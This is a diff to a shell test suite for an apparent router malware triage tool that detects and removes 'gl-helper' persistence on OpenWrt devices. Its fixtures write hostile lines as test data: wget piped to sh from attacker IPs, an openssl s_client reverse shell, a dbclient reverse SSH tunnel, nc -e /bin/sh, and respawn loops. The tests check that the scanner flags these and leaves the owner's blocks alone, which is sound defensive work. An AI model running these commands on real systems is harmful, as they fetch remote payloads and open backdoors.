@@ -639,6 +639,57 @@ run "$D" "$OWL" --fix >"$D/fix.txt"; rc=$?
 expect "--fix removes those lines and keeps the owner's rule (exit $rc)" '[ $rc = 2 ] && grep -q "192.168.8.50" "$D/m/etc/firewall.user" && ! grep -q 65.20.71.131 "$D/m/etc/firewall.user" && ! grep -q watch.sh "$D/m/etc/firewall.d/90-x"'
 umount "$D/m"
 
+echo "=== a path or server that a command only names, a probe, a block taken away (review of 2.53)"
+# The owner's guards: they remove or look for the malware's files, check that a block
+# holds, block the older backdoor's names as the summary advises. None of it is a trace.
+D=$(mkscen guards "$OWL"); U=$D/u
+mkdir -p "$U/etc/hotplug.d/iface" "$U/etc/crontabs" "$U/etc/init.d" "$U/etc/config"
+printf '/root/start-vpn.sh\nrm -rf /etc/config/.gl/ /etc/glinet/.cache\niptables -I OUTPUT -d 65.20.71.131 -j DROP\niptables -I FORWARD -d openwrt-project.org -j DROP\nexit 0\n' >"$U/etc/rc.local"
+printf '0 4 * * * /root/backup.sh\n*/10 * * * * pgrep -f gl-helper && logger -t csa "gl-helper is running"\n*/30 * * * * nc -z -w 3 65.20.71.131 8000 && logger -t csa "block failed"\n5 * * * * wget -q --spider http://gl-inet.top/ && logger -t csa up\n9 * * * * curl -s -o /dev/null http://66.245.219.252:8000/ || logger -t csa ok\n0 3 * * 0 sh /root/gl-helper-triage.sh --archive -o /mnt/usb/gl-helper --no-report\n' >"$U/etc/crontabs/root"
+printf '#!/bin/sh\n[ -e /etc/config/.gl/gl-helper ] && logger -t csa ALERT\n/root/my-ddns.sh\n' >"$U/etc/hotplug.d/iface/99-watch"
+printf '#!/bin/sh /etc/rc.common\nSTART=99\nstart() {\n  iptables -I OUTPUT -d 65.20.71.131 -j DROP\n  /usr/bin/agent -d &\n}\n' >"$U/etc/init.d/sysmon"
+printf '#!/bin/sh\niptables -D OUTPUT -d 65.20.71.131 -j DROP\n' >"$U/etc/init.d/zz-unblock"
+printf "config rule\n\toption name 'Block-backdoor'\n\toption src 'lan'\n\toption dest 'wan'\n\toption dest_ip 'adguardns.com'\n\toption target 'REJECT'\n" >"$U/etc/config/firewall"
+mnt "$D" "$OWL"
+run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
+expect "no IOC, a clean verdict (exit $rc)" '[ $rc = 0 ] && ! grep -qE "^ +IOC " "$D/check.txt" && grep -q "Verdict: no gl-helper indicators found" "$D/check.txt"'
+expect "rc.local and the crontab are PERSIST and say that they only name a path" 'grep -A1 "PERSIST  *persistence  */etc/rc.local" "$D/check.txt" | grep -q "names a path of the malware, but does not run it" && grep -A1 "PERSIST  *persistence  */etc/crontabs/root" "$D/check.txt" | grep -q "names a server of the malware (.*), but does not fetch from it; names a path"'
+expect "a test for a file of the malware is REVIEW path-ref" 'grep -q "REVIEW  *path-ref  */etc/hotplug.d/iface/99-watch" "$D/check.txt"'
+expect "a block does not hide what else a new file starts: INFO server-block and REVIEW new" 'grep -q "INFO  *server-block  */etc/init.d/sysmon" "$D/check.txt" && grep -q "REVIEW  *new  */etc/init.d/sysmon" "$D/check.txt"'
+expect "taking a block away is no block: REVIEW server-ref" 'grep -q "REVIEW  *server-ref  */etc/init.d/zz-unblock" "$D/check.txt" && ! grep -q "server-block  */etc/init.d/zz-unblock" "$D/check.txt"'
+expect "a firewall rule or command that blocks the older backdoor's names is INFO backdoor-block" 'grep -q "INFO  *backdoor-block  */etc/config/firewall" "$D/check.txt" && grep -q "INFO  *backdoor-block  */etc/rc.local" "$D/check.txt" && ! grep -q "backdoor-host" "$D/check.txt"'
+run "$D" "$OWL" --fix >"$D/fix.txt"; rc=$?
+expect "--fix changes none of it (exit $rc)" '[ $rc = 0 ] && grep -q "rm -rf /etc/config/.gl/" "$D/m/etc/rc.local" && grep -q "nc -z" "$D/m/etc/crontabs/root" && [ -f "$D/m/etc/hotplug.d/iface/99-watch" ] && [ -f "$D/m/etc/init.d/sysmon" ]'
+umount "$D/m"
+
+echo "=== what 2.52 found stays found: a continued line, more tools, a program from /tmp, a loop (review of 2.53)"
+D=$(mkscen found "$OWL"); U=$D/u
+mkdir -p "$U/etc/hotplug.d/iface" "$U/etc/crontabs" "$U/etc/init.d" "$U/etc/uci-defaults" "$U/etc/profile.d"
+printf '#!/bin/sh\nwget -q -O /tmp/gb \\\n  http://65.20.71.131:8000/gb && chmod +x /tmp/gb && /tmp/gb\n' >"$U/etc/hotplug.d/iface/99-cont"
+printf '#!/bin/sh /etc/rc.common\nSTART=99\nstart() { dbclient -y -f -N -R 2222:127.0.0.1:22 u@66.245.219.252; }\n' >"$U/etc/init.d/tun"
+printf '#!/bin/sh\nwget-ssl -qO /tmp/n http://gl-inet.top:8899/n; sh /tmp/n\n' >"$U/etc/uci-defaults/99-ssl"
+printf 'openssl s_client -quiet -connect 66.245.219.252:8899 | /bin/sh\n' >"$U/etc/profile.d/x.sh"
+printf '#!/bin/sh /etc/rc.common\nstart() {\n  procd_open_instance\n  procd_set_param command /bin/sh /etc/config/.gl/run.sh\n  procd_close_instance\n}\n' >"$U/etc/init.d/zz-procd"
+printf '(while :; do /etc/glinet/.cache/gl-helper; sleep 30; done) &\nexit 0\n' >"$U/etc/rc.local"
+printf '*/5 * * * * /tmp/gb 65.20.71.131 8000\n' >"$U/etc/crontabs/root"
+printf '# my rules\niptables -I FORWARD -s 192.168.8.50 -j ACCEPT\nif [ -x /usr/bin/wget ]; then\n  wget -qO- http://65.20.71.131:8000/ni.sh | sh\nfi\niptables -t nat -A PREROUTING -p tcp --dport 2222 -j DNAT --to 192.168.8.50:22\n' >"$U/etc/firewall.user"
+mnt "$D" "$OWL"
+run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
+expect "each is IOC persist-ref (exit $rc)" '[ $rc = 1 ] && (for f in /etc/hotplug.d/iface/99-cont /etc/init.d/tun /etc/uci-defaults/99-ssl /etc/profile.d/x.sh /etc/init.d/zz-procd /etc/rc.local /etc/crontabs/root /etc/firewall.user; do grep -q "IOC  *persist-ref  *$f" "$D/check.txt" || exit 1; done)'
+expect "the loop in rc.local starts the malware, the program from /tmp fetches" 'grep -A1 "IOC  *persist-ref  */etc/rc.local" "$D/check.txt" | grep -q "starts the malware (/etc/glinet/.cache/gl-helper)" && grep -A1 "IOC  *persist-ref  */etc/crontabs/root" "$D/check.txt" | grep -q "fetches from a server"'
+expect "the legend says that the firewall's start script is changed although it is listed for review" 'grep -q "Except the malware.s own lines in the firewall.s start script" "$D/check.txt"'
+run "$D" "$OWL" --fix >"$D/fix.txt"; rc=$?
+expect "--fix: the malware's line in firewall.user becomes \":\", the script still reads as one (exit $rc)" '[ $rc = 2 ] && grep -q "^  : # line of the malware" "$D/m/etc/firewall.user" && grep -q "dport 2222" "$D/m/etc/firewall.user" && ! grep -q 65.20.71.131 "$D/m/etc/firewall.user" && env PATH="$TRIAGE_PATH" $TRIAGE_SH -n "$D/m/etc/firewall.user"'
+umount "$D/m"
+
+D=$(mkscen fwif "$OWL"); U=$D/u
+mkdir -p "$U/etc"
+printf '# my rules\nif wget -qO- http://65.20.71.131:8000/ni.sh | sh; then\n  iptables -I FORWARD -s 192.168.8.50 -j ACCEPT\nfi\n' >"$U/etc/firewall.user"
+mnt "$D" "$OWL"
+run "$D" "$OWL" --fix >"$D/fix.txt"; rc=$?
+expect "--fix leaves a firewall.user that would break without the line, and says so (exit $rc)" '[ $rc = 3 ] && grep -q "if wget" "$D/m/etc/firewall.user" && grep -q "left /etc/firewall.user: without the malware.s lines it would no longer run as a script" "$D/fix.txt"'
+umount "$D/m"
+
 echo "=== a deleted rc.local, a failed archive, a run from a pipe"
 D=$(mkscen wo "$OWL"); U=$D/u
 mkdir -p "$U/etc/config/.gl"; echo payload >"$U/etc/config/.gl/gb"
@@ -647,7 +698,7 @@ rm "$D/m/etc/rc.local"
 run "$D" "$OWL" --check >"$D/check.txt"
 expect "a deleted rc.local is INFO deleted, not an odd file" 'grep -q "INFO  *deleted  */etc/rc.local" "$D/check.txt" && ! grep -q "odd-file" "$D/check.txt"'
 run "$D" "$OWL" --fix -o /dev/null/x >"$D/fix.txt" 2>&1; rc=$?
-expect "without an archive --fix changes nothing, still gives the verdict, exit 4" '[ $rc = 4 ] && grep -q "nothing was changed" "$D/fix.txt" && grep -q "Verdict: INFECTED" "$D/fix.txt" && [ -f "$D/m/etc/config/.gl/gb" ]'
+expect "without an archive --fix changes nothing, still gives the verdict, exit 4" '[ $rc = 4 ] && grep -q "nothing was changed" "$D/fix.txt" && grep -q "Verdict: INFECTED" "$D/fix.txt" && [ -f "$D/m/etc/config/.gl/gb" ] && ! grep -q "Copy the evidence archive" "$D/fix.txt"'
 run "$D" "$OWL" --fix >"$D/fix.txt"; rc=$?
 expect "--fix does not bring the deleted rc.local back (exit $rc)" '[ $rc = 2 ] && [ ! -e "$D/m/etc/rc.local" ]'
 env PATH="$TRIAGE_PATH" $TRIAGE_SH -s -- --root "$D/m" --upper "$D/u" --lower "$OWL" --check <"$T" >"$D/pipe.txt" 2>&1
@@ -875,13 +926,28 @@ if [ -n "$BB" ] && file -L "$BB" | grep -q 'statically linked'; then
 	fp 5014 nc 'nc\000170.39.226.219\0004444\0-e\0/bin/sh\0--\0gl-helper-triage\0'
 	fp 5015 sh 'sh\0/root/gl-helper-triage.sh\0--check\0'
 	live --no-report >"$L/procs2.txt"
-	expect "ncat, telnet, a sourced script of the malware and a hiding name are IOC; this script itself is not" 'for n in 5011 5012 5013 5014; do grep -q "IOC  *process  *$n" "$L/procs2.txt" || exit 1; done; ! grep -q "process  *5015" "$L/procs2.txt"'
+	expect "ncat, telnet, a sourced script of the malware and a hiding name are IOC; this script itself is not" '(for n in 5011 5012 5013 5014; do grep -q "IOC  *process  *$n" "$L/procs2.txt" || exit 1; done) && ! grep -q "process  *5015" "$L/procs2.txt"'
 	rm -r "$L"/proc/501?
+	# a respawn loop, more tools, a program from /tmp, a probe, a block taken away, and this
+	# script's name on a program that is not this script (review of 2.53)
+	mkdir -p "$L/tmp/self"; cp "$T" "$L/tmp/self/gl-helper-triage.sh"; echo payload >"$L/tmp/gl-helper-triage.sh"; echo payload >"$L/tmp/gb"
+	fp 5021 sh 'sh\0-c\0while :; do /etc/glinet/.cache/gl-helper; sleep 30; done\0'
+	fp 5022 dbclient 'dbclient\0-N\0-R\0002222:127.0.0.1:22\0u@66.245.219.252\0'
+	fp 5023 gb '/tmp/gb\00065.20.71.131\0008000\0'; ln -sf /tmp/gb "$L/proc/5023/exe"
+	fp 5024 gl-helper-triag '/tmp/gl-helper-triage.sh\00065.20.71.131\0'; ln -sf /tmp/gl-helper-triage.sh "$L/proc/5024/exe"
+	fp 5025 nc 'nc\0-z\0-w\0003\00065.20.71.131\0008000\0'
+	fp 5026 iptables 'iptables\0-D\0OUTPUT\0-d\00065.20.71.131\0-j\0DROP\0'
+	fp 5027 sh '/bin/sh\0-c\0sh /tmp/self/gl-helper-triage.sh --archive -o /mnt/usb/gl-helper\0'
+	live --no-report >"$L/procs3.txt"
+	expect "a loop around the malware, dbclient, a program from /tmp and one named like this script are IOC" '(for n in 5021 5022 5023 5024; do grep -q "IOC  *process  *$n" "$L/procs3.txt" || exit 1; done)'
+	expect "a probe and a block taken away are REVIEW; this script from cron is skipped" 'grep -q "REVIEW  *process  *5025" "$L/procs3.txt" && grep -q "REVIEW  *process  *5026" "$L/procs3.txt" && ! grep -q "INFO  *process  *5026" "$L/procs3.txt" && ! grep -q "process  *5027" "$L/procs3.txt"'
+	rm -r "$L"/proc/502? "$L/tmp/self"; rm -f "$L/tmp/gl-helper-triage.sh" "$L/tmp/gb"
 	# The report keeps the owner's lines and names, and says so in bold before it asks
-	mkdir -p "$L/etc"; printf '/etc/glinet/.cache/gl-helper &\niptables -t nat -A PREROUTING -p tcp --dport 2222 -j DNAT --to 192.168.8.50:22\nexit 0\n' >"$L/etc/rc.local"
-	printf 'root:x:0:0:root:/root:/bin/ash\njsmith-admin:x:0:0::/root:/bin/ash\n' >"$L/etc/passwd"
+	mkdir -p "$L/etc"; printf '/etc/glinet/.cache/gl-helper &\niptables -t nat -A PREROUTING -p tcp --dport 2222 -j DNAT --to 192.168.8.50:22\niptables -I FORWARD -s 192.168.8.60 -d 65.20.71.131 -j DROP\niptables -t nat -A PREROUTING -d 127.0.0.1 -j DNAT --to-destination 127.0.0.1\nexit 0\n' >"$L/etc/rc.local"
+	{ printf 'root:x:0:0:root:/root:/bin/ash\njsmith-admin:x:0:0::/root:/bin/ash\n'; for n in 1 2 3 4 5 6 7 8; do printf 'zz%s:x:0:0::/root:/bin/ash\n' "$n"; done; } >"$L/etc/passwd"
 	live >"$L/ask2.txt"
-	expect "the summary names the addresses and the account that go with the report" 'grep -q "1 of them hold IP addresses that are not the attacker" "$L/ask2.txt" && grep -q "Also the name of each account the firmware does not have: jsmith-admin" "$L/ask2.txt" && ! grep -q "Not sent: host name, IP or MAC" "$L/ask2.txt"'
+	expect "the summary counts a line with the owner's and the attacker's address, not 127.0.0.1" 'grep -q "2 of them hold IP addresses that are not the attacker" "$L/ask2.txt"'
+	expect "the summary names the accounts, and how many more the report holds" 'grep -q "Also the name of each account the firmware does not have: jsmith-admin zz1 .* zz7 and 1 more" "$L/ask2.txt" && grep -q "What stands in the" "$L/ask2.txt" && ! grep -q "Not sent: host name, keys, passwords" "$L/ask2.txt"'
 	rm "$L/etc/rc.local" "$L/etc/passwd"
 	# Tools that are not busybox applets (issue 8): run only when they are the base image's.
 	# The chroot gets a base image with the same busybox and an iptables-save that prints
